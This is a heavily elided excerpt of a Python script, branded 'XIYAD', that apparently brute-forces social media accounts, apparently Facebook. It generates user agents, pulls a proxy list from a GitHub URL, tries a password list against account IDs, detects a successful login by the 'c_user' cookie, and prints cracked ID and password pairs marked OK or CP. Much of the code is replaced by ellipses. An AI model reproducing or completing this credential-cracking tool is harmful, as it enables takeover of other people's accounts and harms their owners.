...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/hridoyshanto/Nobita/blob/main/Nobita.txt').text
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> XIYAD  VERSION :\x1b[1;92m 1.1 ')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[XIYAD-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[XIYAD-OK] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[XIYAD-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[XIYAD-CP] '+ids+' | '+pas+'\033[1;97m')
